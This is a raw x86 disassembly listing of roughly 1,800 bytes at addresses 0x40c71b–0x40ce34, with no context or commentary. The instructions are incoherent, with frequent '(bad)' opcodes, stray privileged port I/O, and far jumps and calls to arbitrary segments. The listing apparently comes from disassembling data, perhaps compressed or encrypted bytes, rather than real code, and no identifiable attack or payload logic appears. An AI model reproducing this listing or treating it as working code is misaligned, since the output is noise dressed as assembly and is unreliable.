  40c71b:	in     eax,dx
  40c71c:	sub    eax,DWORD PTR [ecx-0x23]
  40c71f:	sar    BYTE PTR [ebx+0x3d],cl
  40c722:	add    DWORD PTR [ebp+esi*1-0x69],esp
  40c726:	loop   0x40c799
  40c728:	(bad)  
  40c729:	stos   DWORD PTR es:[edi],eax
  40c72a:	sbb    ah,bl
  40c72c:	adc    ebx,0xd28fceda
  40c732:	in     al,0xd0
  40c734:	xchg   edi,eax
  40c735:	mov    DWORD PTR [ebp+0x775d632e],ecx
  40c73b:	dec    esp
  40c73c:	rcr    BYTE PTR [edi],cl
  40c73e:	or     BYTE PTR [edx],cl
  40c740:	fst    DWORD PTR [ebx+0x76]
  40c743:	push   cs
  40c744:	xchg   DWORD PTR [esi],ebx
  40c746:	xchg   edx,eax
  40c747:	cmp    edi,DWORD PTR [edi]
  40c749:	push   ss
  40c74a:	or     esi,DWORD PTR [edi]
  40c74c:	mov    dh,0xf
  40c74e:	inc    BYTE PTR [eax+0x7c]
  40c751:	adc    ch,al
  40c753:	inc    ebp
  40c754:	gs sbb al,0x4e
  40c757:	add    bl,ah
  40c759:	das    
  40c75a:	mov    ds:0xd440529a,al
  40c75f:	mov    al,ds:0x413a707e
  40c764:	xchg   ecx,eax
  40c765:	sbb    DWORD PTR [edx-0x30],esi
  40c768:	mov    esp,DWORD PTR [esi]
  40c76a:	cld    
  40c76b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c76c:	scas   al,BYTE PTR es:[edi]
  40c76d:	mov    eax,0xe76c0d09
  40c772:	jecxz  0x40c72f
  40c774:	addr16 mov cl,0x2b
  40c777:	pop    ebx
  40c778:	sub    DWORD PTR [esi-0x11],ebx
  40c77b:	inc    BYTE PTR [ebx-0x615549c0]
  40c781:	or     eax,0xbb610a5e
  40c786:	fsubr  QWORD PTR [ecx-0x539ad27d]
  40c78c:	imul   edx,DWORD PTR [ebp-0x71baeb5e],0xffffff8a
  40c793:	fist   DWORD PTR [edi]
  40c795:	imul   esi,DWORD PTR [ebx-0x29d1a55],0x4cd88867
  40c79f:	sbb    DWORD PTR ss:[ebp-0x34361e1f],esp
  40c7a6:	jae    0x40c76a
  40c7a8:	mov    esp,0x170c1075
  40c7ad:	add    esi,DWORD PTR [ebx]
  40c7af:	or     cl,ah
  40c7b1:	jbe    0x40c7cb
  40c7b3:	jecxz  0x40c7d4
  40c7b5:	pop    es
  40c7b6:	jl     0x40c7eb
  40c7b8:	gs cwde 
  40c7ba:	cmc    
  40c7bb:	sbb    bl,dh
  40c7bd:	neg    DWORD PTR [edi-0x323227e1]
  40c7c3:	pop    esp
  40c7c4:	shl    DWORD PTR [edx-0x48611e40],1
  40c7ca:	push   es
  40c7cb:	mov    dl,0xcf
  40c7cd:	jmp    0x40c78d
  40c7cf:	aam    0x8a
  40c7d1:	or     eax,0x63ba0819
  40c7d6:	dec    ebp
  40c7d7:	cs adc edx,esi
  40c7da:	gs (bad) 
  40c7df:	add    al,0x4c
  40c7e1:	loop   0x40c82b
  40c7e3:	jo     0x40c7f0
  40c7e5:	push   ebx
  40c7e6:	dec    edx
  40c7e7:	out    0x2b,al
  40c7e9:	cmp    al,cl
  40c7eb:	xor    eax,0x726ecabb
  40c7f0:	addr16 xor al,0x29
  40c7f3:	lods   al,BYTE PTR ds:[esi]
  40c7f4:	add    dl,BYTE PTR [edx+0x0]
  40c7f7:	(bad)  
  40c7f9:	fsubr  DWORD PTR [ebp-0x5bc7144b]
  40c7ff:	or     dl,BYTE PTR [esi]
  40c801:	pop    edi
  40c802:	dec    edi
  40c803:	inc    eax
  40c804:	xchg   esp,eax
  40c805:	sbb    eax,0xb57062f5
  40c80a:	xchg   ecx,eax
  40c80b:	mov    WORD PTR [eax-0x58c96d7d],cs
  40c811:	shl    BYTE PTR [ebx+ebp*1+0x6b74c96],cl
  40c818:	jmp    0x40c7df
  40c81a:	jmp    DWORD PTR [ecx+0x67]
  40c81d:	xchg   edx,ebx
  40c81f:	add    ebx,DWORD PTR [edi]
  40c821:	xor    al,0x7d
  40c823:	inc    ebp
  40c824:	scas   eax,DWORD PTR es:[edi]
  40c825:	jnp    0x40c7c6
  40c827:	sub    DWORD PTR [ebx-0x5a2d7a6b],esp
  40c82d:	adc    bl,BYTE PTR [ecx+0xd]
  40c830:	add    DWORD PTR [esi-0x6fa01f1a],0x748b2acf
  40c83a:	push   cs
  40c83b:	cmp    ah,BYTE PTR [ebx-0x3461a745]
  40c841:	cld    
  40c842:	mov    dh,0xff
  40c844:	scas   eax,DWORD PTR es:[edi]
  40c845:	dec    eax
  40c846:	leave  
  40c847:	cmp    al,0x8d
  40c849:	adc    DWORD PTR [ebx],edx
  40c84b:	cmp    eax,0x77848ed6
  40c850:	xor    edx,ebp
  40c852:	jnp    0x40c846
  40c854:	mov    esp,0x6621a173
  40c859:	lods   eax,DWORD PTR ds:[esi]
  40c85a:	loop   0x40c827
  40c85c:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40c85e:	jecxz  0x40c895
  40c860:	lock jns 0x40c8d0
  40c863:	sub    al,0x8d
  40c865:	push   0x57e3c053
  40c86a:	sbb    bh,BYTE PTR [edx]
  40c86c:	lds    ebx,FWORD PTR [edi]
  40c86e:	push   edi
  40c86f:	test   BYTE PTR es:[esi-0x6f],dh
  40c873:	mov    al,0x48
  40c875:	jl     0x40c8c8
  40c877:	nop
  40c878:	icebp  
  40c879:	inc    ebp
  40c87a:	mov    ?,WORD PTR [ecx-0xcdbebfb]
  40c880:	dec    esi
  40c881:	xchg   ecx,eax
  40c882:	inc    edi
  40c883:	add    cl,BYTE PTR [ebx+esi*8-0x4b]
  40c887:	mov    BYTE PTR [ebx+edi*1+0x79],0xb4
  40c88c:	comiss xmm6,DWORD PTR [eax]
  40c88f:	sbb    bh,BYTE PTR [ebx]
  40c891:	cwde   
  40c892:	sub    al,0x37
  40c894:	push   ds
  40c895:	stc    
  40c896:	inc    edi
  40c897:	inc    ecx
  40c898:	in     al,dx
  40c899:	add    ebx,DWORD PTR [ebp+0xfee9b2c]
  40c89f:	jne    0x40c832
  40c8a1:	in     al,0x0
  40c8a3:	scas   eax,DWORD PTR es:[edi]
  40c8a4:	jmp    FWORD PTR [eax+0x34]
  40c8a7:	loop   0x40c889
  40c8a9:	cmc    
  40c8aa:	jmp    0x1e73:0xdefb686b
  40c8b1:	add    edx,DWORD PTR ds:0x7c3fc27b
  40c8b7:	test   BYTE PTR [ebp-0x19],0x96
  40c8bb:	nop
  40c8bc:	popf   
  40c8bd:	jge    0x40c88b
  40c8bf:	sub    BYTE PTR [esi],0x81
  40c8c2:	inc    ebp
  40c8c3:	mov    dh,0x60
  40c8c5:	jns    0x40c90b
  40c8c7:	or     dh,cl
  40c8c9:	cld    
  40c8ca:	jmp    0x1505baef
  40c8cf:	mov    eax,ds:0x57c90589
  40c8d4:	test   eax,0x7cbd7cd
  40c8d9:	pushf  
  40c8da:	mov    dl,0x37
  40c8dc:	mov    edx,?
  40c8de:	cld    
  40c8df:	scas   al,BYTE PTR es:[edi]
  40c8e0:	push   ebp
  40c8e1:	sub    BYTE PTR [edx+eax*8],0xb4
  40c8e5:	call   FWORD PTR [ebx-0xe]
  40c8e8:	push   ecx
  40c8e9:	aaa    
  40c8ea:	fisttp DWORD PTR [esi+0x2c]
  40c8ed:	push   cs
  40c8ee:	add    eax,0xe41603f9
  40c8f3:	sub    eax,0x99f0a9da
  40c8f8:	cwde   
  40c8f9:	pop    esi
  40c8fa:	sub    al,0xe
  40c8fc:	aaa    
  40c8fd:	xor    al,0x6e
  40c8ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c900:	pusha  
  40c901:	daa    
  40c902:	jp     0x40c8b4
  40c904:	call   0x98475a03
  40c909:	mov    bh,0xe4
  40c90b:	inc    edx
  40c90c:	fisub  DWORD PTR gs:[eax+eiz*1]
  40c910:	sbb    al,BYTE PTR [ebx]
  40c912:	aaa    
  40c913:	sub    eax,0xec8ce437
  40c918:	sub    DWORD PTR [ebp-0x80],eax
  40c91b:	mov    bh,0x1f
  40c91d:	int3   
  40c91e:	in     eax,dx
  40c91f:	dec    edi
  40c920:	leave  
  40c921:	or     eax,0x61a135c5
  40c926:	jg     0x40c952
  40c928:	nop
  40c929:	ss ds call 0xdcc430a2
  40c930:	lahf   
  40c931:	repnz (bad) [esi+ebx*8-0x7385cb5c]
  40c939:	test   DWORD PTR [ecx],esi
  40c93b:	sbb    BYTE PTR [ebx],ch
  40c93d:	test   BYTE PTR [ebx],al
  40c93f:	shl    DWORD PTR [esi-0x23],0x72
  40c943:	fdiv   QWORD PTR [ebx]
  40c945:	sbb    al,BYTE PTR [ebx+esi*8+0x34cc5c90]
  40c94c:	lds    edx,FWORD PTR [ecx+0x21]
  40c94f:	cmp    BYTE PTR [eax],dh
  40c951:	(bad)  [esi]
  40c953:	inc    edi
  40c954:	test   DWORD PTR [edi+eax*2],ebp
  40c957:	pop    ss
  40c958:	fwait
  40c959:	popa   
  40c95a:	lock fdiv st,st(4)
  40c95d:	adc    BYTE PTR [esi],cl
  40c95f:	cmp    al,0xa
  40c961:	adc    eax,0xc39740ce
  40c966:	cmp    eax,0xb3a3b6c9
  40c96b:	xor    ah,BYTE PTR [ebx+0x26]
  40c96e:	cmp    al,bl
  40c970:	cdq    
  40c971:	or     al,0xa5
  40c973:	test   DWORD PTR [ebx+eiz*1-0x5a],esi
  40c977:	shl    BYTE PTR ds:0x9ba465b8,cl
  40c97d:	pop    edx
  40c97e:	add    al,0xbe
  40c980:	clc    
  40c981:	(bad)  
  40c982:	mov    edi,0xb04f4952
  40c987:	push   ebx
  40c988:	xor    dl,BYTE PTR [ecx]
  40c98a:	(bad)  
  40c98b:	cmp    DWORD PTR [esi-0x4a],esi
  40c98e:	push   edx
  40c98f:	and    BYTE PTR [edi+0x54],bh
  40c992:	push   cs
  40c993:	fiadd  WORD PTR [ebx-0x50]
  40c996:	aas    
  40c997:	je     0x40c928
  40c999:	lahf   
  40c99a:	jmp    0x40c9a9
  40c99c:	cmp    ebx,eax
  40c99e:	into   
  40c99f:	stos   DWORD PTR es:[edi],eax
  40c9a0:	mov    fs,WORD PTR [ebp+0x73df8d9]
  40c9a6:	sahf   
  40c9a7:	add    eax,0xee99982a
  40c9ac:	jecxz  0x40c98a
  40c9ae:	xchg   ecx,eax
  40c9af:	mov    edx,0xc1cf4de8
  40c9b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9b5:	mov    eax,0xbd933f7
  40c9ba:	xor    BYTE PTR [esi+0x5d96da27],0xff
  40c9c1:	loop   0x40c9ec
  40c9c3:	pop    ds
  40c9c4:	and    eax,0x349f486f
  40c9c9:	pop    ss
  40c9ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9cb:	xchg   ebp,eax
  40c9cc:	stos   DWORD PTR es:[edi],eax
  40c9cd:	pusha  
  40c9ce:	sub    DWORD PTR [edi],esi
  40c9d0:	or     DWORD PTR [eax+ecx*4+0x0],edi
  40c9d4:	or     ebx,DWORD PTR [ecx]
  40c9d6:	push   edi
  40c9d7:	mov    al,0x45
  40c9d9:	hlt    
  40c9da:	scas   eax,DWORD PTR es:[edi]
  40c9db:	fild   QWORD PTR [edi+0x7b]
  40c9de:	or     eax,DWORD PTR [ecx+ebp*1+0x748f4cb1]
  40c9e5:	adc    bl,BYTE PTR [edi-0x6a]
  40c9e8:	sub    ecx,eax
  40c9ea:	retf   
  40c9eb:	ret    0xb06b
  40c9ee:	(bad)  
  40c9ef:	mov    BYTE PTR [edi-0x606e5695],bh
  40c9f5:	adc    BYTE PTR [edi],0xa3
  40c9f8:	xchg   ebx,eax
  40c9f9:	loop   0x40ca50
  40c9fb:	cwde   
  40c9fc:	xchg   edi,eax
  40c9fd:	jno    0x40c9b3
  40c9ff:	jbe    0x40c9c2
  40ca01:	aad    0x32
  40ca03:	retf   0x99f9
  40ca06:	cli    
  40ca07:	call   0x9d2be26d
  40ca0c:	dec    eax
  40ca0d:	imul   ebx,esp,0xffffffe5
  40ca10:	pop    ecx
  40ca11:	dec    esp
  40ca12:	lods   eax,DWORD PTR ds:[esi]
  40ca13:	dec    esi
  40ca14:	mov    DWORD PTR [edx+ebx*2],edi
  40ca17:	psubusb mm6,QWORD PTR [esi]
  40ca1a:	ja     0x40ca14
  40ca1c:	jp     0x40ca5d
  40ca1e:	sub    ah,al
  40ca20:	shr    DWORD PTR [ecx-0x39],cl
  40ca23:	or     al,0xf3
  40ca25:	mov    esp,0xc1a699d9
  40ca2a:	mov    dh,0x43
  40ca2c:	push   cs
  40ca2d:	mov    ah,0xa9
  40ca2f:	xchg   edx,eax
  40ca30:	or     ebx,DWORD PTR [edi+0x702d5bc3]
  40ca36:	jle    0x40ca39
  40ca38:	rol    DWORD PTR [edi+0x7e346c5b],0x61
  40ca3f:	sub    eax,0xa9101ea9
  40ca44:	mov    dh,BYTE PTR [ebx-0x43141306]
  40ca4a:	xchg   DWORD PTR [edx-0x4365f5f8],esi
  40ca50:	mov    eax,0x54b14628
  40ca55:	dec    ecx
  40ca56:	arpl   WORD PTR es:[esi],si
  40ca59:	jbe    0x40ca3b
  40ca5b:	pop    ss
  40ca5c:	shld   DWORD PTR [edi-0x5db08a3],eax,cl
  40ca63:	out    dx,al
  40ca64:	cmp    BYTE PTR [ecx+eiz*8-0x40],0xb1
  40ca69:	jl     0x40c9fc
  40ca6b:	sbb    eax,0x6fffa6df
  40ca70:	lea    ebx,[ebp+0x112a5542]
  40ca76:	out    0xfb,eax
  40ca78:	loopne 0x40ca5c
  40ca7a:	es xor eax,0x7d97b6b9
  40ca80:	sti    
  40ca81:	sub    bl,dl
  40ca83:	test   esi,0xb55ea276
  40ca89:	mov    bh,0x99
  40ca8b:	(bad)  
  40ca8c:	hlt    
  40ca8d:	cld    
  40ca8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca8f:	lds    edi,FWORD PTR [ecx+0x57]
  40ca92:	retf   
  40ca93:	cmp    DWORD PTR ds:0x5f936359,eax
  40ca99:	lds    edx,FWORD PTR [esi]
  40ca9b:	and    eax,0x4da7eee8
  40caa0:	jge    0x40caf9
  40caa2:	sahf   
  40caa3:	mov    al,0xe6
  40caa5:	(bad)  
  40caa6:	cmp    eax,0x39e8555e
  40caab:	or     eax,0xe8b8bee8
  40cab1:	mov    eax,0xd7934557
  40cab6:	mov    BYTE PTR [edx+eax*8],dh
  40cab9:	jnp    0x40cab9
  40cabb:	outs   dx,BYTE PTR ds:[esi]
  40cabc:	icebp  
  40cabd:	push   edi
  40cabe:	mov    al,ds:0xa4994e86
  40cac3:	(bad)  
  40cac4:	jne    0x40ca60
  40cac6:	push   edi
  40cac7:	(bad)  
  40cac8:	mov    esi,0xe4c3d8c6
  40cacd:	aaa    
  40cace:	leave  
  40cacf:	mov    esp,0xfaba6071
  40cad4:	mov    bl,0x53
  40cad6:	call   0x93b42469
  40cadb:	ror    BYTE PTR [ecx],cl
  40cadd:	sbb    cl,ah
  40cadf:	inc    esp
  40cae0:	test   BYTE PTR [edx],dl
  40cae2:	stos   BYTE PTR es:[edi],al
  40cae3:	cmp    DWORD PTR [edx-0x35665896],ebp
  40cae9:	fchs   
  40caeb:	int3   
  40caec:	sbb    ch,dh
  40caee:	jo     0x40cb2b
  40caf0:	push   ebp
  40caf1:	or     dh,BYTE PTR [ebp+0x68]
  40caf4:	jmp    0x40cb66
  40caf6:	jl     0x40cab6
  40caf8:	dec    esi
  40caf9:	mov    ecx,0xfd1734c9
  40cafe:	out    0xe8,eax
  40cb00:	mov    eax,ds:0x2d211224
  40cb05:	rol    BYTE PTR [ebp+0x5c659ffc],0x1
  40cb0c:	push   edi
  40cb0d:	cmp    ebp,DWORD PTR [ebp+0x76]
  40cb10:	fistp  DWORD PTR [edi+0x72]
  40cb13:	pop    edx
  40cb14:	lds    ecx,FWORD PTR [ecx-0x4a]
  40cb17:	mov    ch,0x5f
  40cb19:	lea    ecx,[ecx+ebp*4-0x5aa3c1f8]
  40cb20:	sub    ah,cl
  40cb22:	ins    DWORD PTR es:[edi],dx
  40cb23:	jmp    FWORD PTR [edx+0x7dbe1207]
  40cb29:	out    dx,eax
  40cb2a:	xor    eax,0x720fbfc4
  40cb2f:	retf   
  40cb30:	ret    0x626a
  40cb33:	sar    BYTE PTR [ecx+0x2eb40a0],1
  40cb39:	hlt    
  40cb3a:	(bad)  
  40cb3b:	add    eax,DWORD PTR [ebx-0x69]
  40cb3e:	aas    
  40cb3f:	stos   DWORD PTR es:[edi],eax
  40cb40:	or     eax,0x66f65ebe
  40cb45:	or     edi,DWORD PTR [edx]
  40cb47:	push   esp
  40cb48:	pop    es
  40cb49:	stos   BYTE PTR es:[edi],al
  40cb4a:	into   
  40cb4b:	in     eax,dx
  40cb4c:	mov    ?,WORD PTR [ecx-0x164ee1e7]
  40cb52:	idiv   DWORD PTR [eax-0x4c]
  40cb55:	mov    edi,0xb4299be3
  40cb5a:	out    0x20,al
  40cb5c:	pop    edi
  40cb5d:	pushf  
  40cb5e:	es jp  0x40cba7
  40cb61:	ins    BYTE PTR es:[edi],dx
  40cb62:	pop    ds
  40cb63:	rcl    BYTE PTR [eax+0x7f],0xd5
  40cb67:	push   ds
  40cb68:	aad    0x0
  40cb6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb6b:	in     eax,0xc6
  40cb6d:	adc    BYTE PTR [ecx],dh
  40cb6f:	sub    al,al
  40cb71:	xchg   edx,eax
  40cb72:	push   esp
  40cb73:	cli    
  40cb74:	aas    
  40cb75:	push   ebx
  40cb76:	and    BYTE PTR [edx],bh
  40cb78:	test   eax,0x2653e43c
  40cb7d:	mov    bh,0x68
  40cb7f:	add    dh,dh
  40cb81:	sahf   
  40cb82:	inc    ecx
  40cb83:	ins    DWORD PTR es:[edi],dx
  40cb84:	add    DWORD PTR [esp+ecx*8+0x5d6a3628],ecx
  40cb8b:	loop   0x40cbfc
  40cb8d:	push   eax
  40cb8e:	xchg   edx,eax
  40cb8f:	ds inc ebx
  40cb91:	inc    edi
  40cb92:	jg     0x40cb54
  40cb94:	and    al,0x76
  40cb96:	(bad)  
  40cb97:	xchg   ebp,eax
  40cb98:	sbb    ch,BYTE PTR [ecx-0x2fa6c303]
  40cb9e:	stos   DWORD PTR es:[edi],eax
  40cb9f:	ss inc edx
  40cba1:	ja     0x40cb4b
  40cba3:	jmp    0x7758:0x7b403937
  40cbaa:	sahf   
  40cbab:	add    al,BYTE PTR [ebx]
  40cbad:	aaa    
  40cbae:	add    DWORD PTR [ecx+0x78e1cfeb],edx
  40cbb4:	cs mov ah,0x34
  40cbb7:	outs   dx,BYTE PTR ds:[esi]
  40cbb8:	xchg   esi,eax
  40cbb9:	or     eax,0xc6d7ef4e
  40cbbe:	push   ebp
  40cbbf:	scas   al,BYTE PTR es:[edi]
  40cbc0:	or     eax,0xe1f4a560
  40cbc5:	pop    ecx
  40cbc6:	js     0x40cb51
  40cbc8:	das    
  40cbc9:	inc    edi
  40cbca:	and    eax,0xf51e7fbd
  40cbcf:	ds push ebp
  40cbd1:	cmp    eax,0x3b5be938
  40cbd6:	jl     0x40cc38
  40cbd8:	addr16 popf 
  40cbda:	fs pop ecx
  40cbdc:	in     eax,dx
  40cbdd:	push   edx
  40cbde:	in     eax,dx
  40cbdf:	and    al,0x81
  40cbe1:	fs out 0x56,eax
  40cbe4:	repz call 0x2856:0x96121d54
  40cbec:	push   0xffffff9c
  40cbee:	jge    0x40cb99
  40cbf0:	pop    esi
  40cbf1:	ficom  DWORD PTR [esi+0x13]
  40cbf4:	inc    ebp
  40cbf5:	neg    BYTE PTR [ebx]
  40cbf7:	test   DWORD PTR [ecx+0x19],edx
  40cbfa:	mov    ds:0x97675a2e,al
  40cbff:	loope  0x40cbee
  40cc01:	cmp    eax,0xf08ca51
  40cc06:	push   esi
  40cc07:	jecxz  0x40cc36
  40cc09:	pop    ecx
  40cc0a:	pop    edx
  40cc0b:	push   ebx
  40cc0c:	icebp  
  40cc0d:	push   ds
  40cc0e:	je     0x40cbcf
  40cc10:	push   edx
  40cc11:	test   DWORD PTR [esi-0x4a],esi
  40cc14:	(bad)  
  40cc15:	cmp    ecx,DWORD PTR [ebp+eiz*8-0x69]
  40cc19:	pop    ebx
  40cc1a:	das    
  40cc1b:	ret    0xa079
  40cc1e:	push   es
  40cc1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc20:	mov    al,ds:0x45607170
  40cc25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc26:	test   al,0xa9
  40cc28:	mov    cl,0xf3
  40cc2a:	cmp    al,0xb
  40cc2c:	ins    BYTE PTR es:[edi],dx
  40cc2d:	pop    edx
  40cc2e:	retf   
  40cc2f:	cld    
  40cc30:	adc    al,0x4c
  40cc32:	add    al,BYTE PTR [ebx-0x342ade33]
  40cc38:	or     dl,dl
  40cc3a:	xlat   BYTE PTR ds:[ebx]
  40cc3b:	xchg   edi,eax
  40cc3c:	fs dec ebp
  40cc3e:	sub    eax,0xd8fa5bc6
  40cc43:	xchg   DWORD PTR [edx],eax
  40cc45:	daa    
  40cc46:	dec    ebp
  40cc47:	fsub   DWORD PTR [edi+ebx*4+0x46]
  40cc4b:	xchg   edi,eax
  40cc4c:	and    DWORD PTR [edx],0xb954b43a
  40cc52:	sbb    DWORD PTR [edx+0x44a2b8a7],eax
  40cc58:	inc    edx
  40cc59:	xlat   BYTE PTR ds:[ebx]
  40cc5a:	push   ebx
  40cc5b:	xchg   esp,eax
  40cc5c:	xchg   esi,eax
  40cc5d:	int3   
  40cc5e:	repz ret 
  40cc60:	std    
  40cc61:	rcr    BYTE PTR [ebx+0x7eae93ae],0xc2
  40cc68:	std    
  40cc69:	or     esi,DWORD PTR [ecx]
  40cc6b:	cdq    
  40cc6c:	cdq    
  40cc6d:	xchg   edi,eax
  40cc6e:	fbstp  TBYTE PTR [ecx+0x6b63af52]
  40cc74:	sar    BYTE PTR [edx+0x5c],0xaa
  40cc78:	(bad)  
  40cc79:	jmp    0x4700:0x8dd7d67d
  40cc80:	loope  0x40cc4e
  40cc82:	xor    al,0xde
  40cc84:	test   ah,dl
  40cc86:	pusha  
  40cc87:	mov    eax,ds:0xc4a5993d
  40cc8c:	ret    
  40cc8d:	sahf   
  40cc8e:	xchg   esi,eax
  40cc8f:	mov    ah,0x43
  40cc91:	or     BYTE PTR [edi],al
  40cc93:	xlat   BYTE PTR ds:[ebx]
  40cc94:	cli    
  40cc95:	in     eax,0x5e
  40cc97:	(bad)  
  40cc98:	or     ch,BYTE PTR [edx-0x684d394d]
  40cc9e:	popf   
  40cc9f:	pop    es
  40cca0:	mov    bh,0xd7
  40cca2:	dec    esi
  40cca3:	daa    
  40cca4:	jmp    0x6e695513
  40cca9:	mov    edx,0xa2945cdf
  40ccae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ccaf:	out    0x6a,eax
  40ccb1:	aam    0xac
  40ccb3:	push   ds
  40ccb4:	aad    0x8e
  40ccb6:	mov    dl,0xea
  40ccb8:	push   cs
  40ccb9:	xchg   ebx,eax
  40ccba:	loop   0x40cc42
  40ccbc:	pop    eax
  40ccbd:	pop    es
  40ccbe:	ds stos BYTE PTR es:[edi],al
  40ccc0:	jecxz  0x40cc6e
  40ccc2:	or     eax,0x99055e5a
  40ccc7:	leave  
  40ccc8:	inc    eax
  40ccc9:	aam    0xcd
  40cccb:	xor    eax,ebp
  40cccd:	out    0x9,al
  40cccf:	test   BYTE PTR [edi-0x3a],0xcb
  40ccd3:	add    ecx,ebp
  40ccd5:	push   ds
  40ccd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ccd7:	jl     0x40cd07
  40ccd9:	retf   
  40ccda:	(bad)  
  40ccdb:	mov    ch,0xc3
  40ccdd:	mov    cl,0x7c
  40ccdf:	mov    WORD PTR [esi+edi*1+0x4bf73dd1],ds
  40cce6:	jnp    0x40cce8
  40cce8:	bound  ecx,QWORD PTR [ebx-0x1aa2108a]
  40ccee:	push   ecx
  40ccef:	call   FWORD PTR [esi+0x15610a66]
  40ccf5:	cmp    al,0xf3
  40ccf7:	dec    eax
  40ccf8:	and    bl,BYTE PTR [esi]
  40ccfa:	sub    BYTE PTR [esi],al
  40ccfc:	pop    esi
  40ccfd:	dec    edx
  40ccfe:	mov    edx,0xd6cb418a
  40cd03:	pop    ecx
  40cd04:	or     al,0x94
  40cd06:	sub    eax,0x806914af
  40cd0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd0c:	add    eax,0xfad26c91
  40cd11:	xor    dl,cl
  40cd13:	rcr    DWORD PTR [esi+eax*2],0xc4
  40cd17:	cmp    dl,dl
  40cd19:	nop
  40cd1a:	jno    0x40ccb3
  40cd1c:	or     DWORD PTR fs:[ebp+edx*4-0x5b],ecx
  40cd21:	lods   al,BYTE PTR ds:[esi]
  40cd22:	aas    
  40cd23:	ret    
  40cd24:	adc    DWORD PTR [edi-0x69],ecx
  40cd27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd28:	sub    BYTE PTR [edx],ah
  40cd2a:	adc    esp,DWORD PTR [ebx+eax*8]
  40cd2d:	retf   0x9403
  40cd30:	pop    ebp
  40cd31:	sbb    DWORD PTR [edi+edx*4],ebp
  40cd34:	adc    eax,0xc92803ee
  40cd39:	fdiv   DWORD PTR [edi+ebx*8]
  40cd3c:	sti    
  40cd3d:	aaa    
  40cd3e:	es jecxz 0x40cd82
  40cd41:	int3   
  40cd42:	jbe    0x40cd46
  40cd44:	xchg   ebp,eax
  40cd45:	(bad)  
  40cd46:	sti    
  40cd47:	fistp  DWORD PTR [esi-0x15]
  40cd4a:	dec    esp
  40cd4b:	inc    ebx
  40cd4c:	mov    ch,0x87
  40cd4e:	and    al,0xca
  40cd50:	call   0x15f64684
  40cd55:	mov    al,bh
  40cd57:	mov    al,0xdb
  40cd59:	dec    ebp
  40cd5a:	xor    edx,ebp
  40cd5c:	bound  ebp,QWORD PTR [ebx+ecx*2-0x73]
  40cd60:	jo     0x40cce8
  40cd62:	adc    eax,0x8c34e1af
  40cd67:	mov    dh,BYTE PTR [esi-0x49c7194]
  40cd6d:	pusha  
  40cd6e:	adc    DWORD PTR [edi],esi
  40cd70:	daa    
  40cd71:	xchg   esp,eax
  40cd72:	dec    edi
  40cd73:	adc    DWORD PTR [edi+0x58cdac18],ecx
  40cd79:	mov    ds:0x43bf31a8,eax
  40cd7e:	mov    ds:0xd7e0aa36,al
  40cd83:	fucom  st(5)
  40cd85:	sti    
  40cd86:	xor    DWORD PTR [ebp-0x26],esi
  40cd89:	dec    ebx
  40cd8a:	cwde   
  40cd8b:	fstp   TBYTE PTR [edi-0x4b]
  40cd8e:	in     al,dx
  40cd8f:	call   DWORD PTR [ebp-0x68]
  40cd92:	push   0x5d
  40cd94:	shr    DWORD PTR [esp+edi*1-0x6b],1
  40cd98:	lahf   
  40cd99:	sahf   
  40cd9a:	xor    bh,BYTE PTR [ecx-0x3c]
  40cd9d:	std    
  40cd9e:	cmp    cl,cl
  40cda0:	hlt    
  40cda1:	iret   
  40cda2:	(bad)  
  40cda3:	aam    0xce
  40cda5:	je     0x40cd35
  40cda7:	stos   BYTE PTR es:[edi],al
  40cda8:	scas   eax,DWORD PTR es:[edi]
  40cda9:	(bad)  
  40cdaa:	std    
  40cdab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cdac:	test   esp,edx
  40cdae:	stc    
  40cdaf:	test   al,0xbb
  40cdb1:	jb     0x40cd5e
  40cdb3:	add    al,0xf6
  40cdb5:	mov    dl,BYTE PTR [ebx-0x19]
  40cdb8:	retf   0x192a
  40cdbb:	data16 ja 0x40cd8e
  40cdbe:	push   es
  40cdbf:	or     DWORD PTR [edx-0x52bf295d],0x76
  40cdc6:	ds loop 0x40cdc0
  40cdc9:	test   ecx,edx
  40cdcb:	pop    edx
  40cdcc:	or     dh,ch
  40cdce:	aas    
  40cdcf:	popa   
  40cdd0:	cmp    esi,edx
  40cdd2:	push   es
  40cdd3:	dec    ecx
  40cdd4:	mov    ebx,0xffd3b52b
  40cdd9:	sub    BYTE PTR [edi],dh
  40cddb:	xor    ecx,0xffffffcb
  40cdde:	repz pop edi
  40cde0:	ja     0x40cdf6
  40cde2:	or     eax,edi
  40cde4:	sar    BYTE PTR [eax-0x67],cl
  40cde7:	imul   ebp,DWORD PTR [ebx-0x1e0bab5d],0x1c
  40cdee:	fidivr WORD PTR [eax-0x59]
  40cdf1:	aaa    
  40cdf2:	fld    QWORD PTR [ebx]
  40cdf4:	mov    esi,DWORD PTR [edx]
  40cdf6:	jbe    0x40ce21
  40cdf8:	inc    ecx
  40cdf9:	dec    esp
  40cdfa:	pop    ds
  40cdfb:	shr    BYTE PTR ds:0x5f808dd5,1
  40ce01:	pop    es
  40ce02:	bound  esp,QWORD PTR [ebp+0x233800b8]
  40ce08:	jecxz  0x40ce65
  40ce0a:	out    0x87,eax
  40ce0c:	icebp  
  40ce0d:	test   DWORD PTR [ebx+ebx*4],esp
  40ce10:	aad    0xf5
  40ce12:	(bad)  [ebp-0x23]
  40ce15:	leave  
  40ce16:	and    al,0x44
  40ce18:	fsub   DWORD PTR fs:[edi+0x7c47f156]
  40ce1f:	gs xor eax,0xe3cdda1a
  40ce25:	mov    bl,0x67
  40ce27:	push   eax
  40ce28:	mov    dl,0x1d
  40ce2a:	mov    cl,0xe
  40ce2c:	(bad)  
  40ce2d:	mov    eax,ds:0x6dd67457
  40ce32:	dec    eax
  40ce33:	icebp  
  40ce34:	mov    gs,ebx
